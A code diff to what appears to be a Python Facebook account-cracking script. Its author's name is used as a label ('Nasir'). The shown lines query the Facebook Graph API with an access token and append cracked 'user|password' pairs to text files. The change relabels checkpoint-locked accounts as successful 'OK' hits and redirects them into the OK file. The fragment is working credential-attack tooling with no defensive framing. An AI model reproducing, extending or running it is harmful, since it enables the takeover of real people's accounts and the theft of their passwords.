@@ -98,7 +98,7 @@ def hasil(OK,cp):
 	    pass
 	if len(cp) != 0:
 	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mNasir_OK.txt' % (H, P, str(len(ok))))
-	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mNasir_CP.txt' % (H, P, str(len(cp))))
+	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mNasir_OK.txt' % (H, P, str(len(cp))))
 	    input("\x1b[1;97mPress enter to back Nasir Menu ")
 	    sarfraz()
 
@@ -215,10 +215,10 @@ class __xxx__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r%s [Nasir-CP] %s | %s ' % (M, user, pw))
+                        print('\r%s [Nasir-OK] %s | %s ' % (M, user, pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
-                        open('Nasir_CP.txt' , 'a').write('%s\n' % wrt)
+                        open('Nasir_OK.txt' , 'a').write('%s\n' % wrt)
                         break
                     except (KeyError, IOError):
                         month = ''
@@ -226,10 +226,10 @@ class __xxx__:
                         year  = ''
                     except:
                         pass
-                    print('\r%s [Nasir-CP] %s | %s ' % (M, user, pw))
+                    print('\r%s [Nasir-OK] %s | %s ' % (M, user, pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
-                    open('Nasir_CP.txt' , 'a').write('%s\n' % wrt)
+                    open('Nasir_OK.txt' , 'a').write('%s\n' % wrt)
                     break
                 else:
                     continue
